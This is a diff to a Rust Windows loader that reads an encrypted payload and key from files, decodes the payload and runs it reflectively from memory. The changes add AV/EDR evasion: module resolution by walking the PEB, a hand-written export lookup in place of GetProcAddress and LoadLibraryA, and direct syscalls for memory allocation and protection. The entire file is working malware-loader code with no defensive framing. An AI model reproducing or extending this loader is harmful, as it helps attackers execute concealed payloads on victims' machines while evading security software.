@@ -1,20 +1,25 @@
 #[cfg(windows)]
-use std::{mem, ptr};
+use std::{mem, ptr, fs};
+use std::ffi::c_void;
+use std::arch::asm;
+
+#[macro_export]
+macro_rules! container_of {
+    ($ptr:expr, $container:ty, $field:ident) => {
+        ($ptr as *const _ as usize - mem::offset_of!($container, $field)) as *mut $container
+    };
+}
+
+#[cfg(windows)]
+mod syscalls;
 
 #[cfg(windows)]
 use winapi::shared::minwindef::{DWORD, HMODULE, LPVOID};
 #[cfg(windows)]
-use winapi::um::errhandlingapi::GetLastError;
-#[cfg(windows)]
-use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryA};
-#[cfg(windows)]
-use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
-#[cfg(windows)]
-use winapi::um::processthreadsapi::FlushInstructionCache;
-#[cfg(windows)]
 use winapi::um::winnt::{
     MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READONLY,
     PAGE_READWRITE,
+    IMAGE_DATA_DIRECTORY,
 };
 
 // PE Header structures
@@ -47,6 +52,7 @@ struct ImageOptionalHeader64 {
     dll_characteristics: u16, size_of_stack_reserve: usize, size_of_stack_commit: usize,
     size_of_heap_reserve: usize, size_of_heap_commit: usize, loader_flags: u32,
     number_of_rva_and_sizes: u32,
+    data_directory: [IMAGE_DATA_DIRECTORY; 16],
 }
 
 #[repr(C)]
@@ -66,9 +72,6 @@ struct ImageSectionHeader {
 }
 #[repr(C)]
 #[allow(dead_code)]
-struct ImageDataDirectory { virtual_address: u32, size: u32 }
-#[repr(C)]
-#[allow(dead_code)]
 struct ImageImportDescriptor {
     original_first_thunk: u32, time_date_stamp: u32, forwarder_chain: u32, name: u32,
     first_thunk: u32,
@@ -86,6 +89,140 @@ struct ImageTlsDirectory64 {
     address_of_callbacks: u64, size_of_zero_fill: u32, characteristics: u32,
 }
 
+#[repr(C)]
+#[derive(Copy, Clone)]
+struct UnicodeString {
+    length: u16,
+    maximum_length: u16,
+    buffer: *mut u16,
+}
+
+#[repr(C)]
+struct PebLdrData {
+    length: u32,
+    initialized: bool,
+    ss_handle: *mut c_void,
+    in_load_order_module_list: ListEntry,
+    in_memory_order_module_list: ListEntry,
+    in_initialization_order_module_list: ListEntry,
+    entry_in_progress: *mut c_void,
+    shutdown_in_progress: bool,
+    shutdown_thread_id: *mut c_void,
+}
+
+#[repr(C)]
+struct LdrDataTableEntry {
+    in_load_order_links: ListEntry,
+    in_memory_order_links: ListEntry,
+    in_initialization_order_links: ListEntry,
+    dll_base: *mut c_void,
+    entry_point: *mut c_void,
+    size_of_image: u32,
+    full_dll_name: UnicodeString,
+    base_dll_name: UnicodeString,
+    // ... other fields
+}
+
+#[repr(C)]
+struct ListEntry {
+    flink: *mut ListEntry,
+    blink: *mut ListEntry,
+}
+
+#[repr(C)]
+struct Peb {
+    inherited_address_space: bool,
+    read_only_shared_memory: bool,
+    being_debugged: bool,
+    bit_field: u8,
+    mutant: *mut c_void,
+    image_base_address: *mut c_void,
+    ldr: *mut PebLdrData,
+    // ... other fields
+}
+
+unsafe fn get_peb() -> *mut Peb {
+    let peb: *mut Peb;
+    unsafe {
+        asm!("mov {peb}, gs:[0x60]", peb = out(reg) peb);
+    }
+    peb
+}
+
+#[cfg(windows)]
+unsafe fn custom_load_library_a(dll_name: &str) -> HMODULE {
+    unsafe {
+        let peb = get_peb();
+        let ldr = (*peb).ldr;
+        let mut current_entry = (*ldr).in_load_order_module_list.flink;
+        let end_entry = current_entry;
+
+        while !current_entry.is_null() {
+            let ldr_entry = container_of!(current_entry, LdrDataTableEntry, in_load_order_links);
+            let base_dll_name = (*ldr_entry).base_dll_name;
+            let name_slice = std::slice::from_raw_parts(base_dll_name.buffer, base_dll_name.length as usize / 2);
+            let name = String::from_utf16_lossy(name_slice);
+
+            if name.eq_ignore_ascii_case(dll_name) {
+                return (*ldr_entry).dll_base as HMODULE;
+            }
+
+            current_entry = (*current_entry).flink;
+            if current_entry == end_entry {
+                break;
+            }
+        }
+    }
+    ptr::null_mut()
+}
+
+#[cfg(windows)]
+unsafe fn custom_get_proc_address(module: HMODULE, proc_name_or_ordinal: *const i8) -> *mut c_void {
+    unsafe {
+        let dos_header = module as *const ImageDosHeader;
+        let nt_headers = (module as usize + (*dos_header).e_lfanew as usize) as *const ImageNtHeaders64;
+        let optional_header = &(*nt_headers).optional_header;
+        let export_dir_rva = optional_header.data_directory[0].VirtualAddress;
+        let export_dir = (module as usize + export_dir_rva as usize) as *const winapi::um::winnt::IMAGE_EXPORT_DIRECTORY;
+
+        let funcs = std::slice::from_raw_parts(
+            (module as usize + (*export_dir).AddressOfFunctions as usize) as *const u32,
+            (*export_dir).NumberOfFunctions as usize,
+        );
+
+        if (proc_name_or_ordinal as usize) <= 0xFFFF {
+            // By ordinal
+            let ordinal = proc_name_or_ordinal as u16;
+            let func_rva = funcs[ordinal as usize];
+            return (module as usize + func_rva as usize) as *mut c_void;
+        } else {
+            // By name
+            let names = std::slice::from_raw_parts(
+                (module as usize + (*export_dir).AddressOfNames as usize) as *const u32,
+                (*export_dir).NumberOfNames as usize,
+            );
+            let ordinals = std::slice::from_raw_parts(
+                (module as usize + (*export_dir).AddressOfNameOrdinals as usize) as *const u16,
+                (*export_dir).NumberOfNames as usize,
+            );
+            let proc_name = std::ffi::CStr::from_ptr(proc_name_or_ordinal);
+
+            for i in 0..(*export_dir).NumberOfNames as usize {
+                let name_rva = names[i];
+                let name_ptr = (module as usize + name_rva as usize) as *const i8;
+                let name = std::ffi::CStr::from_ptr(name_ptr);
+
+                if name == proc_name {
+                    let ordinal = ordinals[i] as usize;
+                    let func_rva = funcs[ordinal];
+                    return (module as usize + func_rva as usize) as *mut c_void;
+                }
+            }
+        }
+    }
+    ptr::null_mut()
+}
+
 #[cfg(windows)]
 const IMAGE_SCN_MEM_EXECUTE: u32 = 0x20000000;
 #[cfg(windows)]
@@ -100,228 +237,249 @@ const IMAGE_DIRECTORY_ENTRY_BASERELOC: usize = 5;
 const IMAGE_DIRECTORY_ENTRY_TLS: usize = 9;
 
 #[cfg(windows)]
-const SECRET_KEY: &[u8] = &[
-];
-
-#[cfg(windows)]
-const PAYLOAD: &[u8] = &[ 
-];
-
-#[cfg(windows)]
-unsafe fn get_data_directory(nt_headers: *const ImageNtHeaders64, index: usize) -> *const ImageDataDirectory {
-    let optional_header_ptr = &(*nt_headers).optional_header as *const ImageOptionalHeader64;
-    let data_dir_ptr = (optional_header_ptr as usize + mem::offset_of!(ImageOptionalHeader64, number_of_rva_and_sizes) + mem::size_of::<u32>()) as *const ImageDataDirectory;
-    data_dir_ptr.add(index)
+unsafe fn get_data_directory(nt_headers: *const ImageNtHeaders64, index: usize) -> *const IMAGE_DATA_DIRECTORY {
+    unsafe {
+        let optional_header_ptr = &(*nt_headers).optional_header as *const ImageOptionalHeader64;
+        let data_dir_ptr = (optional_header_ptr as usize + mem::offset_of!(ImageOptionalHeader64, number_of_rva_and_sizes) + mem::size_of::<u32>()) as *const IMAGE_DATA_DIRECTORY;
+        data_dir_ptr.add(index)
+    }
 }
 
 #[cfg(windows)]
 unsafe fn set_section_permissions(image_base: *mut u8, section: &ImageSectionHeader) -> Result<(), String> {
-    let characteristics = section.characteristics;
-    let mut protect = PAGE_READONLY;
-    if (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0 {
-        if (characteristics & IMAGE_SCN_MEM_WRITE) != 0 {
-            protect = PAGE_EXECUTE_READWRITE;
+    unsafe {
+        let characteristics = section.characteristics;
+        let mut protect = PAGE_READONLY;
+        if (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0 {
+            if (characteristics & IMAGE_SCN_MEM_WRITE) != 0 {
+                protect = PAGE_EXECUTE_READWRITE;
+            } else if (characteristics & IMAGE_SCN_MEM_READ) != 0 {
+                protect = PAGE_EXECUTE_READ;
+            }
+        } else if (characteristics & IMAGE_SCN_MEM_WRITE) != 0 {
+            protect = PAGE_READWRITE;
         } else if (characteristics & IMAGE_SCN_MEM_READ) != 0 {
-            protect = PAGE_EXECUTE_READ;
+            protect = PAGE_READONLY;
         }
-    } else if (characteristics & IMAGE_SCN_MEM_WRITE) != 0 {
-        protect = PAGE_READWRITE;
-    } else if (characteristics & IMAGE_SCN_MEM_READ) != 0 {
-        protect = PAGE_READONLY;
+        let section_start = image_base.add(section.virtual_address as usize);
+        let mut old_protect = 0;
+        let mut region_size = section.virtual_size as usize;
+        let status = syscalls::nt_protect_virtual_memory(
+            winapi::um::processthreadsapi::GetCurrentProcess(),
+            &mut (section_start as *mut _),
+            &mut region_size,
+            protect,
+            &mut old_protect,
+        );
+        if status != 0 {
+            return Err(format!("Failed to set section protection (error: {})", status));
+        }
+        Ok(())
     }
-    let section_start = image_base.add(section.virtual_address as usize);
-    let mut old_protect = 0;
-    let result = VirtualProtect(section_start as LPVOID, section.virtual_size as usize, protect, &mut old_protect);
-    if result == 0 {
-        return Err(format!("Failed to set section protection (error: {})", GetLastError()));
-    }
-    Ok(())
 }
 
 #[cfg(windows)]
 unsafe fn process_relocations(image_base: *mut u8, nt_headers: *const ImageNtHeaders64) -> Result<(), String> {
-    let reloc_dir = get_data_directory(nt_headers, IMAGE_DIRECTORY_ENTRY_BASERELOC);
-    if (*reloc_dir).virtual_address == 0 {
-        return Ok(());
-    }
-    let preferred_base = (*nt_headers).optional_header.image_base;
-    let delta = image_base as isize - preferred_base as isize;
-    if delta == 0 {
-        return Ok(());
-    }
-    let mut reloc_ptr = image_base.add((*reloc_dir).virtual_address as usize) as *const ImageBaseRelocation;
-    let reloc_end = (reloc_ptr as usize + (*reloc_dir).size as usize) as *const ImageBaseRelocation;
-
-    while (reloc_ptr as usize) < (reloc_end as usize) && (*reloc_ptr).size_of_block > 0 {
-        let count = ((*reloc_ptr).size_of_block as usize - mem::size_of::<ImageBaseRelocation>()) / 2;
-        let entries = (reloc_ptr as usize + mem::size_of::<ImageBaseRelocation>()) as *const u16;
-        for i in 0..count {
-            let entry = *entries.add(i);
-            let reloc_type = entry >> 12;
-            let offset = entry & 0xFFF;
-            if reloc_type == 3 {
-                let patch_addr = image_base.add((*reloc_ptr).virtual_address as usize + offset as usize) as *mut u32;
-                *patch_addr = ((*patch_addr as isize) + delta) as u32;
-            } else if reloc_type == 10 {
-                let patch_addr = image_base.add((*reloc_ptr).virtual_address as usize + offset as usize) as *mut u64;
-                *patch_addr = ((*patch_addr as isize) + delta) as u64;
-            }
+    unsafe {
+        let reloc_dir = get_data_directory(nt_headers, IMAGE_DIRECTORY_ENTRY_BASERELOC);
+        if (*reloc_dir).VirtualAddress == 0 {
+            return Ok(());
         }
-        reloc_ptr = (reloc_ptr as usize + (*reloc_ptr).size_of_block as usize) as *const ImageBaseRelocation;
+        let preferred_base = (*nt_headers).optional_header.image_base;
+        let delta = image_base as isize - preferred_base as isize;
+        if delta == 0 {
+            return Ok(());
+        }
+        let mut reloc_ptr = image_base.add((*reloc_dir).VirtualAddress as usize) as *const ImageBaseRelocation;
+        let reloc_end = (reloc_ptr as usize + (*reloc_dir).Size as usize) as *const ImageBaseRelocation;
+
+        while (reloc_ptr as usize) < (reloc_end as usize) && (*reloc_ptr).size_of_block > 0 {
+            let count = ((*reloc_ptr).size_of_block as usize - mem::size_of::<ImageBaseRelocation>()) / 2;
+            let entries = (reloc_ptr as usize + mem::size_of::<ImageBaseRelocation>()) as *const u16;
+            for i in 0..count {
+                let entry = *entries.add(i);
+                let reloc_type = entry >> 12;
+                let offset = entry & 0xFFF;
+                if reloc_type == 3 {
+                    let patch_addr = image_base.add((*reloc_ptr).virtual_address as usize + offset as usize) as *mut u32;
+                    *patch_addr = ((*patch_addr as isize) + delta) as u32;
+                } else if reloc_type == 10 {
+                    let patch_addr = image_base.add((*reloc_ptr).virtual_address as usize + offset as usize) as *mut u64;
+                    *patch_addr = ((*patch_addr as isize) + delta) as u64;
+                }
+            }
+            reloc_ptr = (reloc_ptr as usize + (*reloc_ptr).size_of_block as usize) as *const ImageBaseRelocation;
+        }
+        Ok(())
     }
-    Ok(())
 }
 
 #[cfg(windows)]
 unsafe fn resolve_imports(image_base: *mut u8, nt_headers: *const ImageNtHeaders64) -> Result<(), String> {
-    let import_dir = get_data_directory(nt_headers, IMAGE_DIRECTORY_ENTRY_IMPORT);
-    if (*import_dir).virtual_address == 0 {
-        return Ok(());
-    }
-    let mut import_desc = image_base.add((*import_dir).virtual_address as usize) as *const ImageImportDescriptor;
-    while (*import_desc).name != 0 {
-        let dll_name_ptr = image_base.add((*import_desc).name as usize);
-        let dll_name = std::ffi::CStr::from_ptr(dll_name_ptr as *const i8);
-        let module = LoadLibraryA(dll_name_ptr as *const i8);
-        if module.is_null() {
-            return Err(format!("Failed to load DLL: {:?} (error: {})", dll_name, GetLastError()));
+    unsafe {
+        let import_dir = get_data_directory(nt_headers, IMAGE_DIRECTORY_ENTRY_IMPORT);
+        if (*import_dir).VirtualAddress == 0 {
+            return Ok(());
         }
-        let mut thunk_ref = if (*import_desc).original_first_thunk != 0 {
-            image_base.add((*import_desc).original_first_thunk as usize) as *const usize
-        } else {
-            image_base.add((*import_desc).first_thunk as usize) as *const usize
-        };
-        let mut func_ref = image_base.add((*import_desc).first_thunk as usize) as *mut usize;
-        while *thunk_ref != 0 {
-            let func_addr = if (*thunk_ref & (1 << 63)) != 0 {
-                let ordinal = (*thunk_ref & 0xFFFF) as u16;
-                GetProcAddress(module, ordinal as usize as *const i8)
-            } else {
-                let import_by_name = image_base.add(*thunk_ref as usize) as *const ImageImportByName;
-                let func_name_ptr = &(*import_by_name).name as *const u8 as *const i8;
-                GetProcAddress(module, func_name_ptr)
-            };
-            if func_addr.is_null() {
-                return Err(format!("Failed to import function (error: {})", GetLastError()));
+        let mut import_desc = image_base.add((*import_dir).VirtualAddress as usize) as *const ImageImportDescriptor;
+        while (*import_desc).name != 0 {
+            let dll_name_ptr = image_base.add((*import_desc).name as usize);
+            let dll_name = std::ffi::CStr::from_ptr(dll_name_ptr as *const i8).to_str().unwrap();
+            let module = custom_load_library_a(dll_name);
+            if module.is_null() {
+                return Err(format!("Failed to load DLL: {}", dll_name));
             }
-            *func_ref = func_addr as usize;
-            thunk_ref = thunk_ref.add(1);
-            func_ref = func_ref.add(1);
+            let mut thunk_ref = if (*import_desc).original_first_thunk != 0 {
+                image_base.add((*import_desc).original_first_thunk as usize) as *const usize
+            } else {
+                image_base.add((*import_desc).first_thunk as usize) as *const usize
+            };
+            let mut func_ref = image_base.add((*import_desc).first_thunk as usize) as *mut usize;
+            while *thunk_ref != 0 {
+                let func_addr = if (*thunk_ref & (1 << 63)) != 0 {
+                    let ordinal = (*thunk_ref & 0xFFFF) as u16;
+                    custom_get_proc_address(module, ordinal as *const i8)
+                } else {
+                    let import_by_name = image_base.add(*thunk_ref as usize) as *const ImageImportByName;
+                    let func_name_ptr = &(*import_by_name).name as *const u8 as *const i8;
+                    custom_get_proc_address(module, func_name_ptr)
+                };
+                if func_addr.is_null() {
+                    return Err(format!("Failed to import function"));
+                }
+                *func_ref = func_addr as usize;
+                thunk_ref = thunk_ref.add(1);
+                func_ref = func_ref.add(1);
+            }
+            import_desc = import_desc.add(1);
         }
-        import_desc = import_desc.add(1);
+        Ok(())
     }
-    Ok(())
 }
 
 #[cfg(windows)]
 unsafe fn process_tls_callbacks(image_base: *mut u8, nt_headers: *const ImageNtHeaders64) -> Result<(), String> {
-    let tls_dir = get_data_directory(nt_headers, IMAGE_DIRECTORY_ENTRY_TLS);
-    if (*tls_dir).virtual_address == 0 {
-        return Ok(());
+    unsafe {
+        let tls_dir = get_data_directory(nt_headers, IMAGE_DIRECTORY_ENTRY_TLS);
+        if (*tls_dir).VirtualAddress == 0 {
+            return Ok(());
+        }
+        let tls = image_base.add((*tls_dir).VirtualAddress as usize) as *const ImageTlsDirectory64;
+        let callbacks_addr = (*tls).address_of_callbacks as usize;
+        if callbacks_addr == 0 {
+            return Ok(());
+        }
+        let mut callback_ptr = callbacks_addr as *const usize;
+        while *callback_ptr != 0 {
+            let callback: extern "system" fn(LPVOID, DWORD, LPVOID) = mem::transmute(*callback_ptr);
+            callback(image_base as LPVOID, 1, ptr::null_mut());
+            callback_ptr = callback_ptr.add(1);
+        }
+        Ok(())
     }
-    let tls = image_base.add((*tls_dir).virtual_address as usize) as *const ImageTlsDirectory64;
-    let callbacks_addr = (*tls).address_of_callbacks as usize;
-    if callbacks_addr == 0 {
-        return Ok(());
-    }
-    let mut callback_ptr = callbacks_addr as *const usize;
-    while *callback_ptr != 0 {
-        let callback: extern "system" fn(LPVOID, DWORD, LPVOID) = mem::transmute(*callback_ptr);
-        callback(image_base as LPVOID, 1, ptr::null_mut());
-        callback_ptr = callback_ptr.add(1);
-    }
-    Ok(())
 }
 
 #[cfg(windows)]
 unsafe fn finalize_sections(image_base: *mut u8, nt_headers: *const ImageNtHeaders64) -> Result<(), String> {
-    let section_header_ptr = (nt_headers as *const ImageNtHeaders64 as usize
-        + mem::size_of::<u32>()
-        + mem::size_of::<ImageFileHeader>()
-        + (*nt_headers).file_header.size_of_optional_header as usize)
-        as *const ImageSectionHeader;
-    for i in 0..(*nt_headers).file_header.number_of_sections {
-        set_section_permissions(image_base, &*section_header_ptr.offset(i as isize))?;
+    unsafe {
+        let section_header_ptr = (nt_headers as *const ImageNtHeaders64 as usize
+            + mem::size_of::<u32>()
+            + mem::size_of::<ImageFileHeader>()
+            + (*nt_headers).file_header.size_of_optional_header as usize)
+            as *const ImageSectionHeader;
+        for i in 0..(*nt_headers).file_header.number_of_sections {
+            set_section_permissions(image_base, &*section_header_ptr.offset(i as isize))?;
+        }
+        syscalls::nt_flush_instruction_cache(
+            winapi::um::processthreadsapi::GetCurrentProcess(),
+            image_base as LPVOID,
+            (*nt_headers).optional_header.size_of_image as usize,
+        );
+        Ok(())
     }
-    use winapi::um::processthreadsapi::GetCurrentProcess;
-    FlushInstructionCache(
-        GetCurrentProcess(),
-        image_base as LPVOID,
-        (*nt_headers).optional_header.size_of_image as usize,
-    );
-    Ok(())
 }
 
 #[cfg(windows)]
 unsafe fn load_pe_from_memory(pe_data: &[u8]) -> Result<(), String> {
-    if pe_data.len() < mem::size_of::<ImageDosHeader>() {
-        return Err("PE data is too small for DOS header".to_string());
-    }
-    
-    let dos_header = &*(pe_data.as_ptr() as *const ImageDosHeader);
-    if dos_header.e_magic != 0x5A4D {
-        return Err("Invalid PE file (MZ signature missing)".to_string());
-    }
-
-    let nt_headers_offset = dos_header.e_lfanew as usize;
-    if nt_headers_offset == 0 || (nt_headers_offset + mem::size_of::<ImageNtHeaders64>()) > pe_data.len() {
-        return Err("Invalid NT header offset or file is too small.".to_string());
-    }
-
-    let nt_headers = &*(pe_data.as_ptr().add(nt_headers_offset) as *const ImageNtHeaders64);
-    if nt_headers.signature != 0x4550 {
-        return Err("Invalid PE signature".to_string());
-    }
-    
-    if nt_headers.optional_header.magic != 0x20b {
-        return Err("Loader only supports 64-bit (x64) PE files.".to_string());
-    }
-
-    let image_size = nt_headers.optional_header.size_of_image as usize;
-    if image_size == 0 {
-        return Err("Invalid PE file (SizeOfImage is zero)".to_string());
-    }
-
-    let image_base = VirtualAlloc(ptr::null_mut(), image_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-
-    if image_base.is_null() {
-        return Err(format!("Memory allocation failed (error: {})", GetLastError()));
-    }
-
-    let headers_size = nt_headers.optional_header.size_of_headers as usize;
-    ptr::copy_nonoverlapping(pe_data.as_ptr(), image_base as *mut u8, headers_size);
-
-    let section_header_ptr = (nt_headers as *const _ as usize
-        + mem::size_of::<u32>()
-        + mem::size_of::<ImageFileHeader>()
-        + nt_headers.file_header.size_of_optional_header as usize)
-        as *const ImageSectionHeader;
-
-    for i in 0..nt_headers.file_header.number_of_sections {
-        let section = &*section_header_ptr.offset(i as isize);
-        if section.size_of_raw_data > 0 {
-            let dest = (image_base as usize + section.virtual_address as usize) as *mut u8;
-            let src = pe_data.as_ptr().offset(section.pointer_to_raw_data as isize);
-            ptr::copy_nonoverlapping(src, dest, section.size_of_raw_data as usize);
+    unsafe {
+        if pe_data.len() < mem::size_of::<ImageDosHeader>() {
+            return Err("PE data is too small for DOS header".to_string());
         }
+
+        let dos_header = &*(pe_data.as_ptr() as *const ImageDosHeader);
+        if dos_header.e_magic != 0x5A4D {
+            return Err("Invalid PE file (MZ signature missing)".to_string());
+        }
+
+        let nt_headers_offset = dos_header.e_lfanew as usize;
+        if nt_headers_offset == 0 || (nt_headers_offset + mem::size_of::<ImageNtHeaders64>()) > pe_data.len() {
+            return Err("Invalid NT header offset or file is too small.".to_string());
+        }
+
+        let nt_headers = &*(pe_data.as_ptr().add(nt_headers_offset) as *const ImageNtHeaders64);
+        if nt_headers.signature != 0x4550 {
+            return Err("Invalid PE signature".to_string());
+        }
+
+        if nt_headers.optional_header.magic != 0x20b {
+            return Err("Loader only supports 64-bit (x64) PE files.".to_string());
+        }
+
+        let image_size = nt_headers.optional_header.size_of_image as usize;
+        if image_size == 0 {
+            return Err("Invalid PE file (SizeOfImage is zero)".to_string());
+        }
+
+        let mut image_base = ptr::null_mut();
+        let mut region_size = image_size;
+        let status = syscalls::nt_allocate_virtual_memory(
+            winapi::um::processthreadsapi::GetCurrentProcess(),
+            &mut image_base,
+            0,
+            &mut region_size,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE,
+        );
+
+        if status != 0 {
+            return Err(format!("Memory allocation failed (error: {})", status));
+        }
+
+        let headers_size = nt_headers.optional_header.size_of_headers as usize;
+        ptr::copy_nonoverlapping(pe_data.as_ptr(), image_base as *mut u8, headers_size);
+
+        let section_header_ptr = (nt_headers as *const _ as usize
+            + mem::size_of::<u32>()
+            + mem::size_of::<ImageFileHeader>()
+            + nt_headers.file_header.size_of_optional_header as usize)
+            as *const ImageSectionHeader;
+
+        for i in 0..nt_headers.file_header.number_of_sections {
+            let section = &*section_header_ptr.offset(i as isize);
+            if section.size_of_raw_data > 0 {
+                let dest = (image_base as usize + section.virtual_address as usize) as *mut u8;
+                let src = pe_data.as_ptr().offset(section.pointer_to_raw_data as isize);
+                ptr::copy_nonoverlapping(src, dest, section.size_of_raw_data as usize);
+            }
+        }
+
+        process_relocations(image_base as *mut u8, nt_headers)?;
+        resolve_imports(image_base as *mut u8, nt_headers)?;
+        finalize_sections(image_base as *mut u8, nt_headers)?;
+        process_tls_callbacks(image_base as *mut u8, nt_headers)?;
+
+        let entry_point = (image_base as usize + nt_headers.optional_header.address_of_entry_point as usize) as *const ();
+
+        if nt_headers.optional_header.subsystem == 2 || nt_headers.optional_header.subsystem == 3 {
+            let entry_fn: extern "system" fn() -> i32 = mem::transmute(entry_point);
+            entry_fn();
+        } else {
+            let dll_main: extern "system" fn(HMODULE, u32, *mut u8) -> i32 = mem::transmute(entry_point);
+            dll_main(image_base as HMODULE, 1, ptr::null_mut()); // DLL_PROCESS_ATTACH
+        }
+
+        Ok(())
     }
-
-    process_relocations(image_base as *mut u8, nt_headers)?;
-    resolve_imports(image_base as *mut u8, nt_headers)?;
-    finalize_sections(image_base as *mut u8, nt_headers)?;
-    process_tls_callbacks(image_base as *mut u8, nt_headers)?;
-
-    let entry_point = (image_base as usize + nt_headers.optional_header.address_of_entry_point as usize) as *const ();
-    
-    if nt_headers.optional_header.subsystem == 2 || nt_headers.optional_header.subsystem == 3 {
-        let entry_fn: extern "system" fn() -> i32 = mem::transmute(entry_point);
-        entry_fn();
-    } else {
-        let dll_main: extern "system" fn(HMODULE, u32, *mut u8) -> i32 = mem::transmute(entry_point);
-        dll_main(image_base as HMODULE, 1, ptr::null_mut()); // DLL_PROCESS_ATTACH
-    }
-
-    Ok(())
 }
 
 #[cfg(windows)]
@@ -335,12 +493,29 @@ fn transform_data(data: &[u8], key: &[u8]) -> Vec<u8> {
 fn main() {
     #[cfg(windows)]
     {
-        if PAYLOAD.is_empty() {
+        syscalls::init_syscalls();
+        let payload = match fs::read("payload.txt") {
+            Ok(data) => data,
+            Err(e) => {
+                eprintln!("[ERROR] Failed to read payload.txt: {}", e);
+                return;
+            }
+        };
+
+        let key = match fs::read("key.txt") {
+            Ok(data) => data,
+            Err(e) => {
+                eprintln!("[ERROR] Failed to read key.txt: {}", e);
+                return;
+            }
+        };
+
+        if payload.is_empty() {
             eprintln!("[ERROR] The PAYLOAD is empty. Please generate a payload and paste it into the source code before compiling.");
             return;
         }
 
-        let decoded_payload = transform_data(PAYLOAD, SECRET_KEY);
+        let decoded_payload = transform_data(&payload, &key);
 
         unsafe {
             if let Err(e) = load_pe_from_memory(&decoded_payload) {
